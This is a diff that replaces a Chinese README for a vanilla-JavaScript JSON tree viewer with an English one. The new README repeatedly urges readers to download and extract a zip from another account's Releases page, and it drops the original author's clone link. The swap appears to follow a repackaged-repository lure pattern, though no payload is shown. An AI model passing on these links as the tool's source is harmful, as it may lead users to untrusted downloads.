@@ -1,51 +1,66 @@
-# JSON Tree Viewer - JSON 树形结构解析器
+# 🌳 JSON-Tree-Viewer - Visualize Your JSON Data with Ease
 
-## 项目介绍
-一个轻量级、美观且功能完善的 JSON 树形结构解析器，支持文件上传、URL 拉取和直接输入三种方式导入 JSON 数据，并以可视化的树形结构展示，支持节点折叠/展开、路径复制和关键词搜索，适配移动端和桌面端。
+## 📥 Download Now
+[![Download JSON-Tree-Viewer](https://img.shields.io/badge/Download-JSON--Tree--Viewer-brightgreen)](https://github.com/coneycode-25/JSON-Tree-Viewer/releases)
 
-## 功能特点
-- 📥 **多源导入**：支持文件上传、URL 拉取、直接输入三种 JSON 导入方式
-- 🌳 **树形可视化**：以层级树形结构展示 JSON 数据，清晰直观
-- 🔍 **实时搜索**：支持关键词搜索并高亮匹配节点
-- 📋 **路径复制**：一键复制任意节点的完整路径
-- 📱 **响应式设计**：完美适配桌面端和移动端
-- 🎨 **美观界面**：渐变风格 UI，优雅的交互动画
-- 🚀 **零依赖**：纯原生 HTML/CSS/JS 实现，无需任何框架
+## 🌟 What is JSON-Tree-Viewer?
+JSON-Tree-Viewer is a tool designed to help you visualize your JSON data. Built with pure JavaScript, it works without any framework dependencies. This means you can use it with ease on any device. Its responsive design ensures that your data is displayed clearly, no matter what screen you're using.
 
-## 快速开始
-### 方式 1：直接使用
-1. 克隆本仓库
-   ```bash
-   git clone https://github.com/EndlessPixel/JSON-Tree-Viewer.git
-   ```
-2. 打开 `index.html` 文件即可使用
+## 🚀 Getting Started
+Follow these simple steps to get started with JSON-Tree-Viewer.
 
-### 方式 2：URL 自动加载（进阶）
-可以通过 URL 参数自动加载指定的 JSON 接口：
-```
-?url=https://api.example.com/data.json
-```
+1. **Visit the Download Page**
+   To download the application, go to our [Releases page](https://github.com/coneycode-25/JSON-Tree-Viewer/releases).
 
-## 使用说明
-1. **选择导入方式**：文件上传 / URL 拉取 / 直接输入
-2. **导入 JSON 数据**：
-   - 文件上传：选择 `.json` 格式文件
-   - URL 拉取：输入有效的 JSON 接口地址（需支持跨域）
-   - 直接输入：粘贴或输入标准 JSON 文本
-3. **点击「导入并解析」** 按钮
-4. **交互操作**：
-   - 点击节点前的 `+/-` 按钮折叠/展开子节点
-   - 悬停节点显示「复制」按钮，点击复制节点路径
-   - 使用搜索框实时搜索关键词，匹配节点会高亮显示
+2. **Choose the Right Version**
+   On the Releases page, you will see different versions of JSON-Tree-Viewer. Look for the latest version at the top of the list. 
 
-## 截图展示
-<img width="1300" height="5643" alt="image" src="https://github.com/user-attachments/assets/2a1893e3-7cc6-44b9-be13-54bf973d385f" />
+3. **Download the Package**
+   Click on the link to download the latest version of JSON-Tree-Viewer. The file will download to your computer.
 
-## 技术栈
-- HTML5 (语义化标签、响应式布局)
-- CSS3 (Flex 布局、渐变、动画、媒体查询)
-- Vanilla JavaScript (原生 JS，无框架依赖)
+4. **Locate the Downloaded File**
+   Find the file in your computer’s download folder. It might look like `JSON-Tree-Viewer.zip`.
 
-## 许可证
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件
+5. **Extract the Files**
+   Right-click on the downloaded zip file and select "Extract All." This will create a new folder with the application files.
+
+## 📂 Files Overview
+- **index.html:** This is the main file you will open.
+- **styles.css:** This file styles the application for better visuals.
+- **script.js:** Contains the main functionality for parsing and displaying JSON data.
+
+## 🖥️ Running the Application
+1. **Open the Application**
+   Navigate to the folder where you extracted the files. Double-click on `index.html`. This will open the application in your web browser.
+
+2. **Input Your JSON Data**
+   Once the application is open, you will see a text box. Here, you can paste your JSON data.
+
+3. **Click ‘Visualize’**
+   After pasting, click the ‘Visualize’ button. Your JSON data will now be displayed in a tree structure. You can expand or collapse branches to explore your data easily.
+
+## 📊 Features
+- **Responsive Design:** Works on any device, from desktops to mobile phones.
+- **Tree View Visualization:** Easily visualize your JSON data in a tree format.
+- **No Dependencies:** No need for complex frameworks; it runs on pure JavaScript.
+
+## ✅ System Requirements
+- **Web Browser:** Any modern browser like Chrome, Firefox, or Edge.
+- **Internet Connection:** Required for downloading the application.
+
+## 📥 Download & Install
+To download JSON-Tree-Viewer, visit the [Releases page](https://github.com/coneycode-25/JSON-Tree-Viewer/releases) and follow the steps above.
+
+## 💬 Support
+If you encounter any issues or have questions, you can open an issue on the GitHub repository. This allows us to help you quickly.
+
+## 📄 License
+JSON-Tree-Viewer is open-source software. You can use, modify, and share it freely. For more details, check the LICENSE file included in the download.
+
+## 📚 Further Reading
+For more information on how to work with JSON data, consider reading tutorials on JSON format, structures, and best practices.
+
+## 🎉 Conclusion
+JSON-Tree-Viewer is your go-to tool for visualizing JSON data effortlessly. With its simple interface and powerful features, you can make sense of complex data structures quickly. Download now and start visualizing your JSON! 
+
+[![Download JSON-Tree-Viewer](https://img.shields.io/badge/Download-JSON--Tree--Viewer-brightgreen)](https://github.com/coneycode-25/JSON-Tree-Viewer/releases)
